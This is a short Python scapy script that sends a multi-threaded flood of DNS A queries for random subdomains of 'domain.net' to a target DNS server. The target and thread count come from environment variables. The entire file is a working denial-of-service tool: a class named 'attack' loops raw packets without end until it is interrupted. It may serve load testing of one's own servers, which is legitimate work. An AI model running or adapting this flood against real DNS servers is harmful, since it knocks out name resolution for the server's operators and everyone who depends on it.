#!/bin/python
import sys
import threading
from scapy.config import conf
conf.ipv6_enabled = False
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import fcntl, socket, struct
from collections import OrderedDict
from time import sleep
from httplib import HTTPConnection, _CS_IDLE
import urlparse, string, random
victim = os.getenv('TARGET', '127.0.0.1')
dst_mac = None
while dst_mac == None:
   dst_mac = getmacbyip(victim)
interface = conf.route.route(victim)[0]


threads = os.getenv('THREADS', '10')

def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
    return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]

class RandNormalIP(RandString):
    def __init__(self, iptemplate="0.0.0.0/0"):
        self.ip = Net(iptemplate)
    def _fix(self):
        x = self.ip.choice()
        while ((x in Net("0.0.0.0/8")) or (x in Net("10.0.0.0/8")) or (x in Net("127.0.0.0/8"))
                or (x in Net("172.16.0.0/12")) or (x in Net("192.168.0.0/16")) or (x in Net("224.0.0.0/4"))):
            x = self.ip.choice()
        return x

class RandFinalString(RandString):
    def __init__(self, size, term):
        RandString.__init__(self, size)
        self.term = term
    def _fix(self):
        return RandString._fix(self)+self.term


class attack(threading.Thread):
     def __init__ (self):
         threading.Thread.__init__(self)

     def run(self):
       print('Sending DNS A queries for <random>.domain.net to '+victim+' ('+dst_mac+') from '+interface+' interface. Press Ctrl-C to interrupt')
       while True:
         sendp(Ether(src=getHwAddr(interface),dst=dst_mac)/IP(dst=victim)/UDP(sport=RandShort(),dport=53)/DNS(rd=1,qd=DNSQR(qname=RandFinalString(10,".domain.net"))),iface=interface,inter=0,loop=1)

for host in range(int(threads)):
     try:
         port = sys.argv[2]
     except IndexError:
       at = attack()
       at.start()
